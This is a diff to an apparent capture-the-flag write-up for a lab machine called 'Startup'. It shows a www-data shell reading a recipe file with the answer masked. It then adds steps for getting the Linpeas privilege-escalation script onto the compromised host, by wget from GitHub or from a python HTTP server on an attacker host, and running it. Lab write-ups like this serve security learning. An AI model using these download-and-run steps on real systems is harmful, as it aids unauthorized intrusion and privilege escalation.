@@ -80,5 +80,29 @@ Read the file /recipe.txt
 ```
 www-data@startup:/$ 
 cat /recipe.txt
-Someone asked what our main ingredient to our spice soup is today. I figured I can't keep it a secret forever and told him it was ****.
+Someone asked what our main ingredient to our spice soup is today. I figured <br> I can't keep it a secret forever and told him it was ****.
+```
+**********
+### Linpeas (finding a weakness)
+2 ways to get the Linpeas script oto the host.
+1. 
+```
+cd /tmp
+wget https://github.com/carlospolop/PEASS-ng/releases/download/20230205/linpeas.sh
+chmod +x linpeas.sh
+```
+
+```
+download to LHOST
+start a http server on LHOST
+python -m http.server 53
+
+Download to RHOST
+cd /tmp
+wget http://LHOST-IP:53/linpeas.sh
+chmod +x linpeas.sh
+```
+Now lest run Linpeas
+```
+www-data@startup:/tmp$ ./linpeas.sh
 ```
